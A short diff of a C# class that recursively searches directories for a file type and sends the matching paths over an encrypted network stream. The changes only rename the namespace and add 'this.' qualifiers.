@@ -3,7 +3,7 @@ using System.IO;
 using System.Net.Sockets;
 using bc.srv.Classes.Comunicator;
 
-namespace bc.srv.Muduli.File_Manager
+namespace bc.srv.Modules.File_Manager
 {
     internal class Search
     {
@@ -13,7 +13,7 @@ namespace bc.srv.Muduli.File_Manager
 
         public Search(NetworkStream ctorNet)
         {
-            myNetWork = ctorNet;
+            this.myNetWork = ctorNet;
         }
 
 
@@ -25,7 +25,7 @@ namespace bc.srv.Muduli.File_Manager
         /// <returns></returns>
         public void RecursiveSearch(string sDir, string sFileType)
         {
-            if (!stopMe)
+            if (!this.stopMe)
             {
                 var listaFiles = new List<string>();
 
@@ -40,11 +40,11 @@ namespace bc.srv.Muduli.File_Manager
                             listaFiles.Add(f);
 
                         if (listaFiles.Count > 0)
-                            SendList(listaFiles);
+                            this.SendList(listaFiles);
 
                         listaFiles.Clear();
 
-                        RecursiveSearch(d, sFileType);
+                        this.RecursiveSearch(d, sFileType);
                     }
                     catch
                     {
@@ -70,7 +70,7 @@ namespace bc.srv.Muduli.File_Manager
                     listaFiles.Add(f);
 
                 if (listaFiles.Count > 0)
-                    SendList(listaFiles);
+                    this.SendList(listaFiles);
             }
             catch
             {
@@ -84,7 +84,7 @@ namespace bc.srv.Muduli.File_Manager
         private void SendList(List<string> sendingList)
         {
             var message = "";
-            var mm = new MsgManager(myNetWork);
+            var mm = new MsgManager(this.myNetWork);
 
             // INVIO RISPOSTA
             foreach (var file in sendingList)
@@ -103,7 +103,7 @@ namespace bc.srv.Muduli.File_Manager
             var ok = mm.WaitForEncryMessageRicorsive(15000);
 
             if (ok != "OK")
-                stopMe = true;
+                this.stopMe = true;
         }
 
 
@@ -113,9 +113,9 @@ namespace bc.srv.Muduli.File_Manager
         public void SendStop()
         {
             var message = "__STOP__";
-            var mm = new MsgManager(myNetWork);
+            var mm = new MsgManager(this.myNetWork);
             var sent = mm.SendLargeEncryMessage(message, 10000);
-            myNetWork.Close();
+            this.myNetWork.Close();
         }
     }
 }
